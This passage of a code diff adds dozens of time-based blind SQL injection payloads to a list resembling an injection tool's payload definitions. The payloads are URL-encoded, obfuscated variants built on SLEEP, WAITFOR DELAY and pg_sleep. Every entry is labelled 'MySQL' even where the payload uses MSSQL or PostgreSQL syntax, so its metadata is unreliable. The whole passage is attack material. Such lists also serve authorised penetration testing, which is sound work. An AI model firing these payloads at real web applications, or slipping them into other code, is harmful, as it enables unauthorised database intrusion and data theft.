+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20xor(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%7C(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%7C(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%7C(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%7C(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\"%20%7C(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\")%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\")%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\")%20WAITFOR%20DELAY%20N'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";pg_sleep(dexp(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "\";pg_sleep(dexp(10))--%20",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%26(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%26(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(BINARY(SELECT(sleep(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(BINARY(SELECT(sleep(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(BINARY(SELECT(sleep(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(BINARY(SELECT(sleep(TIME(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(BINARY(SELECT(sleep(TIME(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(last_day(if(now()=sysdate(),sleep(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(last_day(if(now()=sysdate(),sleep(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(last_day(if(now()=sysdate(),sleep(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20and%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20and%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
